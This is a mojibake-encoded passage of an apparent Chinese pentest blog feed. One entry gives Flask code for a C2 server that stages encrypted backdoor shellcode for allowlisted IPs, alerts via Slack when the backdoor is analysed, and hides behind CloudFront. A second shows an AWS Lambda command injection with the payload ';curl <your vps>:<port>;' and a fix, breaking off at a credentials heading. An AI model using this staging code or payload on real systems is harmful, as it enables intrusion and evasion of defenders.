span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>é˜²å¾¡æ€§C2ç©å…·å°è¯•</title>
    <link href="https://jkme.github.io/2021/04/06/defense-from-c2.html"/>
    <id>https://jkme.github.io/2021/04/06/defense-from-c2.html</id>
    <published>2021-04-05T16:00:00.000Z</published>
    <updated>2022-01-21T02:45:42.671Z</updated>
    
    <content type="html"><![CDATA[<h3 id="èƒŒæ™¯éœ€æ±‚"><a href="#èƒŒæ™¯éœ€æ±‚" class="headerlink" title="èƒŒæ™¯éœ€æ±‚"></a>èƒŒæ™¯éœ€æ±‚</h3><p>ä¸ç®¡ä¸€ä¸ªä»€ä¹ˆå½¢å¼çš„åé—¨ï¼šå®šæ—¶ä»»åŠ¡ã€dllåŠ«æŒã€å¼€æœºå¯åŠ¨â€¦ï¼Œå½“æˆ‘è®¾ç½®çš„åé—¨è¿è¡Œçš„æ—¶å€™ï¼Œæˆ‘æƒ³æŒæ¡åé—¨çš„å¯åŠ¨æ—¶é—´ã€è§¦å‘IPç­‰ä¸Šç¯å¢ƒï¼Œæ‰€ä»¥è¿™ç¯‡æ–‡ç« æ˜¯åœ¨shellcodeåˆ†ç¦»å…æ€çš„åŸºç¡€ä¸Šåšäº†å°è¯•æ€§æ‰©å±•</p><h4 id="è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š"><a href="#è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š" class="headerlink" title="è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š"></a>è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š</h4><ul><li>åé—¨è¢«é™æ€åˆ†æ</li><li>åé—¨è¢«åŠ¨æ€åˆ†æ</li><li>shellcodeè¢«æå–ä¹‹åè§¦å‘</li><li>â€¦</li></ul><p>åœ¨shellcodeåˆ†ç¦»å…æ€çš„åŸºç¡€ä¸Šæ‰©å±•è¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“çš„ï¼Œå½“å®¢æˆ·ç«¯è¯·æ±‚è¿œç¨‹shellcodeæ‰˜ç®¡æœåŠ¡å™¨çš„æ—¶å€™ï¼Œå¢åŠ ä¸€ä¸ªæœºå™¨äººï¼Œç„¶åå‘èµ·ä¸€ä¸ªä¸Šçº¿é€šçŸ¥ï¼šIf This Then Thatï¼Œè¿™æ ·å¤ªç®€å•äº†ï¼Œæˆ‘ä»¬å†å¤šåŠ ç‚¹æ–™ï¼Œæ¯”å¦‚ï¼š</p><ol><li>ä¸å¸¦åˆç†å‚æ•°è¯·æ±‚shellcodeçš„URLæ—¶å€™ï¼Œå‘èµ·è­¦å‘Š</li><li>å½“æœ¨é©¬è¿è¡Œåœ¨æ¶æ„ç¯å¢ƒçš„æ—¶å€™ï¼Œå‘èµ·è­¦å‘Š<ul><li>å½“æœ¨é©¬ä¸Šçº¿IPä¸åœ¨æœåŠ¡ç«¯åˆ—è¡¨</li><li>å½“æœ¨é©¬ä¸Šçº¿ä¸»æœºçš„è®¾å¤‡æŒ‡çº¹ä¸åœ¨æœåŠ¡ç«¯åˆ—è¡¨</li></ul></li><li>shellcodeæ‰˜ç®¡æœåŠ¡éšæ—¶å¯ä»¥å…³é—­æ‰“å¼€</li><li>shellcodeæ‰˜ç®¡æœåŠ¡éšæ—¶å¯ä»¥æ–°å¢åˆ é™¤æœ¨é©¬ä¸Šçº¿IPæˆ–è€…è®¾å¤‡æŒ‡çº¹</li></ol><h3 id="å‡†å¤‡ææ–™"><a href="#å‡†å¤‡ææ–™" class="headerlink" title="å‡†å¤‡ææ–™"></a>å‡†å¤‡ææ–™</h3><ul><li>ä¸€å°VPSï¼šæ‰˜ç®¡shellcodeï¼Œé€šçŸ¥slackæœºå™¨äºº</li><li>ä¸€ä¸ªAWSè´¦å·éšè—C2ï¼ˆCloudFrontï¼‰</li><li>Slackï¼šæ¥æ”¶é€šçŸ¥ï¼Œä½¿ç”¨<code>Slash commands</code>åŠŸèƒ½æ§åˆ¶shellcodeæ‰˜ç®¡æœåŠ¡</li></ul><h5 id="æ‰˜ç®¡shellcodeæµç¨‹"><a href="#æ‰˜ç®¡shellcodeæµç¨‹" class="headerlink" title="æ‰˜ç®¡shellcodeæµç¨‹"></a>æ‰˜ç®¡shellcodeæµç¨‹</h5><p><img src="/2021/04/06/defense-from-c2/18.png"></p><h5 id="Slacké€šçŸ¥"><a href="#Slacké€šçŸ¥" class="headerlink" title="Slacké€šçŸ¥"></a>Slacké€šçŸ¥</h5><p><img src="/2021/04/06/defense-from-c2/slack.png"></p><h5 id="Slash-Command"><a href="#Slash-Command" class="headerlink" title="Slash Command"></a>Slash Command</h5><p><img src="/2021/04/06/defense-from-c2/9.png"></p><p>è¿™ä¸ªç‚¹æ˜¯ä»TGä¸Šç¤¾å·¥åº“è·‘è·¯å¾—æ¥çš„æ€è·¯ï¼Œå½“æ‰§è¡Œä»»ä½•ä¸€ä¸ªå‘½ä»¤çš„æ—¶å€™ï¼Œéƒ½ä¼šå‘èµ·ä¸€ä¸ªè¯·æ±‚åˆ°VPSï¼Œç„¶åVPSå¤„ç†è¯·æ±‚ã€‚<br>åœ¨slacké‡Œé¢å¢åŠ <code>slach commands</code>:</p><ul><li><code>/boot</code> å¼€å¯shellcodeæ‰˜ç®¡æœåŠ¡</li><li><code>/delete</code> åˆ é™¤IPç™½åå•ï¼Œ<code>/delete ip 127.0.0.1</code> </li><li><code>/info</code> è·å–æ‰˜ç®¡shellcodeæœåŠ¡å™¨çš„çŠ¶æ€</li><li><code>/add</code> å¢åŠ IPç™½åå•ï¼Œ<code>/add ip 127.0.0.1</code></li><li><code>/shutdown</code> å…³é—­shellcodeæ‰˜ç®¡æœåŠ¡å™¨</li></ul><p>å¤§æ¦‚æµç¨‹æ˜¯è¿™æ ·ï¼ŒIPç™½åå•ç›´æ¥ä½¿ç”¨redisæ¥å­˜å‚¨ï¼Œå¯ä»¥è®¾ç½®ä¸€ä¸ªIPä¸º<code>*</code>çš„æ—¶å€™ï¼Œä»»ä½•IPéƒ½èƒ½ä¸Šçº¿ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/curd'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@verify_check</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    command <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"command"</span><span class="token punctuation">]</span>    text <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span>    l <span class="token operator">=</span> text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>get_switch<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The Command is &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The Text is &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"db status &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>get_agent_status<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> command <span class="token operator">==</span> <span class="token string">"/add"</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> l<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"ip"</span><span class="token punctuation">:</span>            redis<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">"ip_&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>l<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            msg <span class="token operator">=</span> set_msg<span class="token punctuation">(</span><span class="token string">"å¢åŠ  &#123;&#125;æˆåŠŸ, çŠ¶æ€: &#123;&#125;\nå½“å‰æ•°æ®åº“: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>l<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> l<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> get_agent_status<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            robot<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>verify_check</code>æ˜¯éªŒè¯è¯·æ±‚æ˜¯å¦ä»slackå‘èµ·çš„ï¼Œå®Œæ•´ä»£ç ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">verify_check</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token decorator annotation punctuation">@wraps</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment"># https://api.slack.com/authentication/verifying-requests-from-slack</span>            <span class="token comment"># https://slack.dev/python-slack-sdk/oauth/index.html#app-installation-flow</span>            <span class="token comment"># if request.form and request.form['token'] == "":</span>            slack_signing_secret <span class="token operator">=</span> <span class="token string">'secret'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            timestamp <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'X-Slack-Request-Timestamp'</span><span class="token punctuation">]</span>            request_body <span class="token operator">=</span> request<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            <span class="token comment"># print("request data &#123;&#125;".format(request.get_data()))</span>            <span class="token comment"># print(request.values)</span>            <span class="token comment"># request_body = urlencode(request.values)</span>            <span class="token comment"># print("request data is &#123;&#125;".format(request_body))</span>            sig_basestring <span class="token operator">=</span> <span class="token string">'v0:'</span> <span class="token operator">+</span> timestamp <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> request_body            <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">float</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">"Resource not found"</span><span class="token punctuation">)</span>            my_signature <span class="token operator">=</span> <span class="token string">'v0='</span> <span class="token operator">+</span> hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>                slack_signing_secret<span class="token punctuation">,</span>                sig_basestring<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                hashlib<span class="token punctuation">.</span>sha256            <span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            slack_signature <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'X-Slack-Signature'</span><span class="token punctuation">]</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>my_signature<span class="token punctuation">,</span> slack_signature<span class="token punctuation">)</span>            <span class="token keyword">if</span> hmac<span class="token punctuation">.</span>compare_digest<span class="token punctuation">(</span>my_signature<span class="token punctuation">,</span> slack_signature<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">"Resource not found"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">"Resource not found"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> wrapper<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="shellcodeæ‰˜ç®¡ä¼ªä»£ç "><a href="#shellcodeæ‰˜ç®¡ä¼ªä»£ç " class="headerlink" title="shellcodeæ‰˜ç®¡ä¼ªä»£ç "></a>shellcodeæ‰˜ç®¡ä¼ªä»£ç </h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/i-am-unreachable'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment"># é™æ€åˆ†æè­¦å‘Š</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>getlist<span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>getlist<span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">not</span> post_validate<span class="token punctuation">(</span>v<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> request_data <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>        user_agent <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">)</span>        method <span class="token operator">=</span> request<span class="token punctuation">.</span>method        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> get_switch<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># å¼€å…³å…³é—­çŠ¶æ€</span>        msg_fail<span class="token punctuation">(</span>now<span class="token punctuation">,</span> domain<span class="token punctuation">,</span> user<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> c2_info<span class="token punctuation">,</span> <span class="token string">"æœåŠ¡å™¨æ‰˜ç®¡å¼€å…³å…³é—­ï¼Œæ‰“å¼€è¯·å‘é€æŒ‡ä»¤: **/boot**"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> not_found<span class="token punctuation">(</span><span class="token punctuation">)</span>    ip_str <span class="token operator">=</span> <span class="token string">"ip_&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span>    <span class="token keyword">if</span> check<span class="token punctuation">(</span>ip_str<span class="token punctuation">)</span><span class="token punctuation">:</span>        shell_str <span class="token operator">=</span> <span class="token string">"shell_&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>server<span class="token punctuation">)</span>        msg_success<span class="token punctuation">(</span>now<span class="token punctuation">,</span> domain<span class="token punctuation">,</span> user<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> c2_info<span class="token punctuation">)</span>        encrypt <span class="token operator">=</span> encrypt_shell<span class="token punctuation">(</span>key<span class="token punctuation">,</span> redis<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shell_str<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>encrypt<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'text/plain'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="é—ç•™é—®é¢˜"><a href="#é—ç•™é—®é¢˜" class="headerlink" title="é—ç•™é—®é¢˜"></a>é—ç•™é—®é¢˜</h3><ol><li>æˆ‘ç›´æ¥é€‰æ‹©IPä½œä¸ºç™½åå•ï¼Œå½“IPåœ¨ç™½åå•ï¼Œå¹¶ä¸”shellcodeæ‰˜ç®¡å¼€å…³æ‰“å¼€çš„æ—¶å€™ï¼Œå‘é€shellcodeã€‚æ·±å…¥ä¸€ç‚¹å¯ä»¥ä½¿ç”¨Machine Keyä½œä¸ºåˆ¤æ–­å†³ç­–ï¼Œæ¯”å¦‚<code>HKLM\SOFTWARE\Microsoft\Cryptography</code>ï¼Œåœ¨æœ¨é©¬åˆæ¬¡è¿è¡Œçš„æ—¶å€™å‘é€Keyåˆ°æœåŠ¡ç«¯ï¼Œä¹‹åæ¯æ¬¡è¿è¡Œçš„æ—¶å€™éƒ½æ£€æµ‹æ˜¯å¦åœ¨æœåŠ¡ç«¯çš„åå•é‡Œé¢ã€‚</li><li>dllå¯ä»¥ä½¿ç”¨socketåˆ†ç¦»shellcodeï¼Œæ€è·¯å’Œä¸Šé¢ä¸€æ ·ã€‚socketæœåŠ¡å™¨çš„éšè—å¯ä»¥é€‰æ‹©AWSçš„ELB(<del>æœ‰ç‚¹è´µ</del>)ç±»ä¼¼çš„åŠ é€ŸæœåŠ¡</li></ol><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://idiotc4t.com/persistence/zhu-ji-te-zheng-bang-ding-mu-ma">ä¸»æœºç‰¹å¾ç»‘å®šæœ¨é©¬</a></li><li><a href="https://github.com/i-saint/scribble/blob/8318bd26adfcb8f26ed8c428e43769d48e75bfbc/MachineGUID.cpp">Github MachineGuid</a></li><li><a href="https://github.com/captainwong/jlib/blob/0b41c6deaa2acaf1642d9b54f6ebd2944f114f13/jlib/win32/DeviceUniqueIdentifier.h">Github DeviceUniqueIdentifier</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;èƒŒæ™¯éœ€æ±‚&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯éœ€æ±‚&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯éœ€æ±‚&quot;&gt;&lt;/a&gt;èƒŒæ™¯éœ€æ±‚&lt;/h3&gt;&lt;p&gt;ä¸ç®¡ä¸€ä¸ªä»€ä¹ˆå½¢å¼çš„åé—¨ï¼šå®šæ—¶ä»»åŠ¡ã€dllåŠ«æŒã€å¼€æœºå¯åŠ¨â€¦ï¼Œå½“æˆ‘è®¾ç½®çš„åé—¨è¿è¡Œçš„æ—¶å€™ï¼Œæˆ‘æƒ³æŒæ¡åé—¨çš„å¯åŠ¨æ—¶é—´ã€è§¦å‘IPç­‰ä¸Šç¯å¢ƒï¼Œæ‰€ä»¥è¿™ç¯‡æ–‡ç« æ˜¯åœ¨shellcodeåˆ†ç¦»å…æ€çš„åŸºç¡€ä¸Šåšäº†å°è¯•æ€§æ‰©å±•&lt;/p&gt;
&lt;h4 id=&quot;è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š&quot;&gt;&lt;a href=&quot;#è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š&quot; class=&quot;headerlink&quot; title=&quot;è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š&quot;&gt;&lt;/a&gt;è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;åé—¨è¢«é™æ€åˆ†æ&lt;/li&gt;
&lt;li&gt;åé—¨è¢«åŠ¨æ€åˆ†æ&lt;/li&gt;
&lt;li&gt;shellcodeè¢«æå–ä¹‹åè§¦å‘&lt;/li&gt;
&lt;li&gt;â€¦&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;åœ¨shellcodeåˆ†ç¦»å…æ€çš„åŸºç¡€ä¸Šæ‰©å±•è¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“çš„ï¼Œå½“å®¢æˆ·ç«¯è¯·æ±‚è¿œç¨‹shellcodeæ‰˜ç®¡æœåŠ¡å™¨çš„æ—¶å€™ï¼Œå¢åŠ ä¸€ä¸ªæœºå™¨äººï¼Œç„¶åå‘èµ·ä¸€ä¸ªä¸Šçº¿é€šçŸ¥ï¼šIf This Then Thatï¼Œè¿™æ ·å¤ªç®€å•äº†ï¼Œæˆ‘ä»¬å†å¤šåŠ ç‚¹æ–™ï¼Œæ¯”å¦‚ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä¸å¸¦åˆç†å‚æ•°è¯·æ±‚shellcodeçš„URLæ—¶å€™ï¼Œå‘èµ·è­¦å‘Š&lt;/li&gt;
&lt;li&gt;å½“æœ¨é©¬è¿è¡Œåœ¨æ¶æ„ç¯å¢ƒçš„æ—¶å€™ï¼Œå‘èµ·è­¦å‘Š&lt;ul&gt;
&lt;li&gt;å½“æœ¨é©¬ä¸Šçº¿IPä¸åœ¨æœåŠ¡ç«¯åˆ—è¡¨&lt;/li&gt;
&lt;li&gt;å½“æœ¨é©¬ä¸Šçº¿ä¸»æœºçš„è®¾å¤‡æŒ‡çº¹ä¸åœ¨æœåŠ¡ç«¯åˆ—è¡¨&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;shellcodeæ‰˜ç®¡æœåŠ¡éšæ—¶å¯ä»¥å…³é—­æ‰“å¼€&lt;/li&gt;
&lt;li&gt;shellcodeæ‰˜ç®¡æœåŠ¡éšæ—¶å¯ä»¥æ–°å¢åˆ é™¤æœ¨é©¬ä¸Šçº¿IPæˆ–è€…è®¾å¤‡æŒ‡çº¹&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;å‡†å¤‡ææ–™&quot;&gt;&lt;a href=&quot;#å‡†å¤‡ææ–™&quot; class=&quot;headerlink&quot; title=&quot;å‡†å¤‡ææ–™&quot;&gt;&lt;/a&gt;å‡†å¤‡ææ–™&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;ä¸€å°VPSï¼šæ‰˜ç®¡shellcodeï¼Œé€šçŸ¥slackæœºå™¨äºº&lt;/li&gt;
&lt;li&gt;ä¸€ä¸ªAWSè´¦å·éšè—C2ï¼ˆCloudFrontï¼‰&lt;/li&gt;
&lt;li&gt;Slackï¼šæ¥æ”¶é€šçŸ¥ï¼Œä½¿ç”¨&lt;code&gt;Slash commands&lt;/code&gt;åŠŸèƒ½æ§åˆ¶shellcodeæ‰˜ç®¡æœåŠ¡&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;æ‰˜ç®¡shellcodeæµç¨‹&quot;&gt;&lt;a href=&quot;#æ‰˜ç®¡shellcodeæµç¨‹&quot; class=&quot;headerlink&quot; title=&quot;æ‰˜ç®¡shellcodeæµç¨‹&quot;&gt;&lt;/a&gt;æ‰˜ç®¡shellcodeæµç¨‹&lt;/h5&gt;&lt;p&gt;&lt;img src=&quot;/2021/04/06/defense-from-c2/18.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Lambdaè¿œç¨‹å‘½ä»¤æ‰§è¡Œæµ‹è¯•</title>
    <link href="https://jkme.github.io/2021/04/01/aws-lambda-rce.html"/>
    <id>https://jkme.github.io/2021/04/01/aws-lambda-rce.html</id>
    <published>2021-03-31T16:00:00.000Z</published>
    <updated>2022-01-21T03:41:19.518Z</updated>
    
    <content type="html"><![CDATA[<h3 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h3><p>æµ‹è¯•çš„æ—¶å€™å‘ç°AWSçš„Lambdaé‡Œé¢æœ‰è¿™æ ·çš„ä»£ç ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºæ¥å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">execute_command <span class="token operator">=</span> <span class="token string">"ffmpeg -i "</span> <span class="token operator">+</span> video_url <span class="token operator">+</span> <span class="token string">" -y -f "</span> <span class="token operator">+</span> img_format <span class="token operator">+</span> <span class="token string">" -ss "</span> <span class="token operator">+</span> time_index <span class="token operator">+</span> <span class="token string">" -vframes 1 "</span> <span class="token operator">+</span> WH <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> output_path<span class="token keyword">print</span><span class="token punctuation">(</span>execute_command<span class="token punctuation">)</span>cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>execute_command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ”»å‡»çš„Payloadï¼š <code>;curl &lt;your vps&gt;:&lt;port&gt;;</code>ï¼Œç„¶ååœ¨è‡ªå·±æœåŠ¡å™¨ç›‘å¬å¯ä»¥æ”¶åˆ°Lambdaå®¹å™¨å‘èµ·çš„è¯·æ±‚ã€‚</p><h5 id="ä¿®å¤ä»£ç "><a href="#ä¿®å¤ä»£ç " class="headerlink" title="ä¿®å¤ä»£ç :"></a>ä¿®å¤ä»£ç :</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"ffmpeg"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">,</span> video_url<span class="token punctuation">,</span> <span class="token string">"-y"</span><span class="token punctuation">,</span> <span class="token string">"-f"</span><span class="token punctuation">,</span> img_format<span class="token punctuation">,</span> <span class="token string">"-ss"</span><span class="token punctuation">,</span> time_index<span class="token punctuation">,</span> <span class="token string">"-vframes"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> output_path<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å‚¨å¤‡çŸ¥è¯†"><a href="#å‚¨å¤‡çŸ¥è¯†" class="headerlink" title="å‚¨å¤‡çŸ¥è¯†"></a>å‚¨å¤‡çŸ¥è¯†</h3><ul><li>Lambdaå‡½æ•°ä»£ç è·¯å¾„: <code>/var/task</code></li><li>ç”¨æˆ·å‡­è¯: 